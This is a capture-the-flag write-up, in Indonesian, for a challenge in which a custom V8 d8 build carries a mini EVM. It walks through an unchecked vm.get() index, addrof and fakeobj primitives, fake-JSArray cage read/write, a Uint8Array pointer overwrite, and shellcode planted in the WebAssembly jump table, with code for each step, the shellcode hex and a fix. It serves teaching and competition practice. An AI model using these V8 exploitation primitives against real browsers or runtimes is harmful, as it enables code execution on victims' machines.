# Web3JS

## Informasi Challenge

- CTF: No Hack No CTF 2026
- Kategori: Web
- Difficulty: Easy
- Deskripsi: `I implemented a web3js in v8. Easy Pwn`

Service menjalankan build custom `d8` yang ditambah sebuah mini EVM. Client mengirim satu baris JavaScript dalam format base64, lalu script dijalankan sebagai user `ctf` selama maksimal 60 detik.

Flag berada di `/flag.txt` dengan permission `0400` milik root. Binary setuid `/readflag` disediakan untuk mencetak flag, jadi target akhirnya adalah native code execution di proses `d8` lalu menjalankan `/readflag`.

## Deployment

`serve.sh` membaca satu baris base64 dan menjalankannya dengan `d8`:

```bash
IFS= read -r LINE
printf '%s' "$LINE" | base64 -d > run.js
exec timeout 60 /opt/chal/d8 ./run.js
```

Container berjalan sebagai user tidak privileged:

```dockerfile
USER ctf
```

Sementara `/readflag` memiliki bit setuid:

```dockerfile
chown root:root /readflag
chmod 4755 /readflag
```

Jadi membaca `/flag.txt` langsung tidak cukup. Exploit harus mencapai RCE dan mengeksekusi helper tersebut.

## Recon Binary

Binary `d8` tidak stripped dan masih menyimpan symbol fungsi custom EVM:

```bash
nm -C d8 | grep -E 'Evm(Get|Push|Input|Memory|Stack|Run)'
```

Beberapa symbol penting:

```text
v8::(anonymous namespace)::EvmGetCallback(...)
v8::(anonymous namespace)::EvmPushCallback(...)
v8::(anonymous namespace)::EvmInputCallback(...)
v8::(anonymous namespace)::EvmRuntime::Push(...)
v8::(anonymous namespace)::EvmRuntime::CopyFromBytes(...)
```

Interface JavaScript yang diberikan:

```javascript
const vm = evm("600160020100");
vm.run();
vm.stack(1);
vm.step();
vm.get(index);
vm.push(value);
vm.input(hexString);
```

Bug utama berada di callback `vm.get(index)`.

## Vulnerability: Out-of-Bounds `vm.get()`

Disassembly `EvmGetCallback` memperlihatkan ukuran satu elemen stack adalah `0x28` byte:

```asm
lea    (%rax,%rax,4),%rax
shl    $0x3,%rax
```

Operasi tersebut menghitung:

```text
size * 5 * 8 = size * 40 = size * 0x28
```

Pointer awal akses dibentuk dari ujung stack:

```asm
mov    runtime.stack_size,%rax
lea    (%rax,%rax,4),%rax
shl    $0x3,%rax
add    runtime.stack_begin,%rax
```

Index dari JavaScript kemudian diubah menjadi komplemen bit dan dikalikan `0x28`:

```asm
not    %rdx
lea    (%rcx,%rcx,4),%rdx
mov    0x8(%rax,%rdx,8),%rcx
```

Secara efektif, callback membaca:

```text
stack_end - (index + 1) * sizeof(EvmWord)
```

Tidak ada pemeriksaan bahwa `index < stack_size`. Nilai besar membuat akses berjalan jauh sebelum array stack dan membaca area lain di dalam `EvmRuntime`.

Layout object native stabil. Saat stack berisi satu elemen, `vm.get(1638)` menunjuk ke EVM memory pada offset `0x10`.

## Layout `EvmWord`

Satu `EvmWord` berukuran 40 byte. Untuk word yang menyimpan object JavaScript, layout yang dibutuhkan adalah:

```text
+0x00  type = 1
+0x08  raw tagged V8 pointer
+0x10  padding
...
+0x27
```

Mini EVM menyimpan raw tagged pointer V8 di dalam object native. Kombinasi ini mengubah OOB native menjadi primitive `fakeobj`.

## Primitive `addrof`

`vm.push(object)` memasukkan object JavaScript ke stack EVM. `vm.stack(1)` kemudian mengembalikan representasi raw word tersebut.

```javascript
function addrof(object) {
  const vm = evm("00");
  vm.push(object);
  return BigInt(vm.stack(1)[0]);
}
```

Primitive ini memberi tagged address dari object V8.

## Primitive `fakeobj`

Fake `EvmWord` ditulis ke EVM memory dengan `CALLDATACOPY`:

```javascript
const vm = evm("6028600060103700");
```

Bytecode tersebut menyalin `0x28` byte dari calldata ke memory offset `0x10`.

Payload fake word:

```javascript
const fakeWord =
  le64(1n) +        // EvmWord type: JavaScript object
  le64(address) +   // raw tagged pointer
  "00".repeat(24);
```

Setelah byte disalin, satu nilai dummy didorong agar stack size menjadi satu. OOB read kemudian diarahkan ke fake word:

```javascript
vm.push(0);
return vm.get(1638);
```

`vm.get()` melihat `type = 1`, mengambil field pointer pada offset `+0x08`, dan mengembalikannya sebagai object JavaScript.

Primitive lengkap:

```javascript
function fakeobj(address) {
  const vm = evm("6028600060103700");
  const fakeWord = le64(1n) + le64(address) + "00".repeat(24);

  vm.input(fakeWord);
  vm.run();
  vm.push(0);

  return vm.get(1638);
}
```

Sekarang tersedia dua primitive dasar:

```text
addrof(object)  -> tagged address
fakeobj(address) -> object dari tagged address
```

## Fake Array dan V8 Cage Read/Write

V8 build ini memakai pointer compression. Pointer object di heap direpresentasikan sebagai offset 32-bit di dalam cage 4 GB.

Snapshot yang diberikan membuat map address stabil:

```javascript
const DOUBLE_ARRAY_MAP = 0x0100d30dn;
const EMPTY_FIXED_ARRAY = 0x000007e5n;
```

Array `crafted` dipakai sebagai backing memory untuk fake `JSArray`:

```javascript
const crafted = [
  u2f((EMPTY_FIXED_ARRAY << 32n) | DOUBLE_ARRAY_MAP),
  u2f((0x20n << 32n) | EMPTY_FIXED_ARRAY),
  13.37,
  14.47,
  15.57,
  16.67,
  17.77,
  18.87,
];
```

Elements backing store berada `0x40` byte sebelum tagged array address:

```javascript
const fakeArray = fakeobj(addrof(crafted) - 0x40n);
```

Field elements pada fake array dapat diarahkan ke alamat mana pun di dalam cage. Karena V8 membaca data `FixedDoubleArray` dari `elements + 7`, target diset menjadi `address - 7`:

```javascript
function setCageTarget(address) {
  const compressedElements = BigInt.asUintN(32, address - 7n);
  crafted[1] = u2f((0x20n << 32n) | compressedElements);
}
```

Read dan write 64-bit di dalam V8 cage:

```javascript
function cageRead64(address) {
  setCageTarget(address);
  return f2u(fakeArray[0]);
}

function cageWrite64(address, value) {
  setCageTarget(address);
  fakeArray[0] = u2f(value);
}
```

## Dari Cage Write ke Native Arbitrary Write

`Uint8Array` menyimpan raw backing-store pointer pada offset `+0x30` dari object base. Pointer tersebut bukan compressed pointer dan menunjuk ke memory native.

```javascript
const writer = new Uint8Array(0x100);
const writerAddress = addrof(writer) - 1n;
const originalDataPointer = cageRead64(writerAddress + 0x30n);
```

Dengan `cageWrite64`, field backing pointer dapat diganti ke alamat native target:

```javascript
function nativeWrite(address, hexBytes) {
  cageWrite64(writerAddress + 0x30n, address);

  for (let i = 0; i < hexBytes.length / 2; i++) {
    writer[i] = parseInt(hexBytes.slice(i * 2, i * 2 + 2), 16);
  }

  cageWrite64(writerAddress + 0x30n, originalDataPointer);
}
```

Penulisan ke `writer[i]` sekarang mendarat di alamat native yang dipilih. Setelah selesai, backing pointer asli dipulihkan agar garbage collector tidak langsung menemui pointer rusak.

## Mendapatkan Halaman Executable dari WebAssembly

V8 menyediakan executable memory untuk WebAssembly. Solver membuat fungsi Wasm minimal:

```javascript
const wasmFunction = new WebAssembly.Instance(
  new WebAssembly.Module(wasmBytes)
).exports.run;
```

Tagged address fungsi diubah menjadi object base:

```javascript
const functionBase = addrof(wasmFunction) - 1n;
const cageBase = functionBase & ~0xffffffffn;
```

Pointer compression dibalik dengan menggabungkan `cageBase` dan offset 32-bit. Chain object yang dipakai:

```text
JSFunction
  -> SharedFunctionInfo
  -> WasmExportedFunctionData
  -> WasmInternalFunction
  -> WasmTrustedInstanceData
  -> jump_table_start
```

Implementasinya:

```javascript
const sharedInfo =
  cageBase + (cageRead64(functionBase + 0x10n) & 0xffffffffn) - 1n;

const exportedData =
  cageBase + (cageRead64(sharedInfo) >> 32n) - 1n;

const internalFunction =
  cageBase + (cageRead64(exportedData + 0x10n) & 0xffffffffn) - 1n;

const trustedInstanceData =
  cageBase + ((cageRead64(internalFunction) >> 32n) & 0xffffffffn) - 1n;

const jumpTableStart = cageRead64(trustedInstanceData + 0x28n);
```

`jump_table_start` adalah raw native pointer ke kode Wasm yang dapat dieksekusi.

## Shellcode

Shellcode x86-64 menjalankan:

```c
execve("/readflag", ["/readflag"], NULL);
```

Hex shellcode:

```text
4831d2488d3d1e00000052574889e648c7c03b0000000f05
48c7c0e700000048c7c7010000000f052f72656164666c616700
```

Shellcode ditulis ke jump table Wasm:

```javascript
nativeWrite(jumpTableStart, SHELLCODE_HEX);
```

Lalu fungsi Wasm dipanggil:

```javascript
wasmFunction();
```

Control flow masuk ke shellcode, proses menjalankan setuid `/readflag`, dan flag dicetak ke socket.

## Exploit Chain

```text
vm.get(index) tidak mengecek batas
        ↓
OOB read terhadap EvmWord sebelum stack
        ↓
Fake EvmWord di EVM memory
        ↓
addrof + fakeobj
        ↓
Fake JSArray
        ↓
Arbitrary read/write dalam V8 pointer-compression cage
        ↓
Overwrite backing pointer Uint8Array
        ↓
Native arbitrary write
        ↓
Leak WebAssembly jump_table_start
        ↓
Tulis shellcode ke executable Wasm memory
        ↓
Panggil fungsi Wasm
        ↓
execve("/readflag")
        ↓
Flag
```

## Solver

Solver menerima beberapa format target:

```bash
python3 solve.py HOST PORT
python3 solve.py HOST:PORT
python3 solve.py nc://HOST:PORT
python3 solve.py http://HOST:PORT
```

Contoh:

```bash
python3 solve.py HOST:PORT
```

Solver membangun JavaScript exploit, melakukan base64 encoding, mengirimnya sebagai satu baris, lalu menunggu output `/readflag`.

Output remote:

```text
[*] Connecting to HOST:PORT
Send your base64-encoded d8 script on a single line:
running...
NHNC{your_smart_contract_is_too_smart_so_it_escaped_lol}
<FLAG>NHNC{your_smart_contract_is_too_smart_so_it_escaped_lol}</FLAG>
```

## Flag

```text
NHNC{your_smart_contract_is_too_smart_so_it_escaped_lol}
```

## Root Cause dan Perbaikan

Akar masalahnya bukan implementasi opcode EVM, tetapi binding JavaScript `vm.get(index)` yang memakai index user tanpa bounds check.

Validasi minimal:

```cpp
if (index >= runtime->stack_size()) {
    isolate->ThrowRangeError("stack index out of range");
    return;
}
```

Pointer JavaScript juga sebaiknya tidak disimpan sebagai raw integer di object native yang dapat dibaca atau ditempa melalui API EVM. Gunakan handle V8 yang sesuai, pertahankan lifetime melalui persistent handle, dan jangan expose representasi tagged pointer ke JavaScript.
